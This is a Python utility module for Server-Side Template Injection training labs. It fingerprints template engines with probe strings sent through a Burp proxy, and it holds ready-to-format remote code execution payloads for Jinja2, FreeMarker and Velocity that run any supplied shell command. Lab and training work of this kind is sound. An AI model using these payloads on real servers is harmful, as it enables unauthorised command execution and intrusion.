"""
utils.py — shared helpers for the Server-Side Template Injection module labs.

📝 Note: back to being fully request-driven like SQLi/SSRF — every lab here
is scriptable end-to-end with `requests`. The interesting part is the
RECON step (identifying which template engine, then finding/crafting the
right RCE payload for it) more than any special transport trick.
"""

from proxies import BURP_PROXIES, VERIFY_SSL
import requests


def get_session():
    s = requests.Session()
    s.proxies.update(BURP_PROXIES)
    s.verify = VERIFY_SSL
    return s


def log(msg, ok=True):
    prefix = "[+]" if ok else "[-]"
    print(f"{prefix} {msg}")


def note(msg):
    """📝 Educational aside — prints a short explainer inline with exploit output."""
    print(f"📝 {msg}")


# ---- Identification -----------------------------------------------------

# Classic polyglot probe: different template engines interpret different
# parts of this differently, and the RESULT (or error) narrows it down fast.
# ${{<%[%'"}}%\ is the single-string version; below is the staged approach
# that's easier to read results from.
POLYGLOT_PROBE = "${{<%[%'\"}}%\\"

MATH_PROBES = {
    "{{7*7}}": "49",       # Jinja2, Twig
    "${7*7}": "49",        # FreeMarker (and others)
    "#{7*7}": "49",        # some Ruby/Java EL-style engines
    "*{7*7}": "49",        # Thymeleaf
    "@(7*7)": "49",        # Razor
    "<%= 7*7 %>": "49",    # ERB
    "{{=7*7}}": "49",      # some custom/other engines
}


def identify_engine(session, url, inject_fn):
    """
    Try each math probe (via inject_fn, which POSTs/GETs it into the
    vulnerable param and returns the response text) and report which ones
    evaluate — narrows down the template engine fast.
    """
    hits = []
    for probe, expected in MATH_PROBES.items():
        text = inject_fn(session, probe)
        evaluated = expected in text
        log(f"{probe!r:20} -> {'evaluated' if evaluated else 'not evaluated'}", ok=evaluated)
        if evaluated:
            hits.append(probe)
    return hits


# ---- Known RCE payloads by engine ---------------------------------------
# 📝 These are the well-known "getting a shell" one-liners for each engine's
# unsandboxed default. Expect to adapt them — exact payload often depends
# on what object/context variables are actually in scope on the page.

JINJA2_RCE = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('{cmd}').read() }}"
JINJA2_RCE_ALT = "{{ cycler.__init__.__globals__.os.popen('{cmd}').read() }}"  # when self/config blocked

FREEMARKER_RCE = (
    '<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("{cmd}")}}'
)

VELOCITY_RCE = (
    "#set($x='')"
    "#set($rt=$x.class.forName('java.lang.Runtime'))"
    "#set($chr=$x.class.forName('java.lang.Character'))"
    "#set($str=$x.class.forName('java.lang.String'))"
    "#set($ex=$rt.getRuntime().exec('{cmd}'))"
    "$ex.waitFor()"
    "#set($out=$ex.getInputStream())"
    "#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"
)


def format_rce(template, cmd):
    return template.format(cmd=cmd)
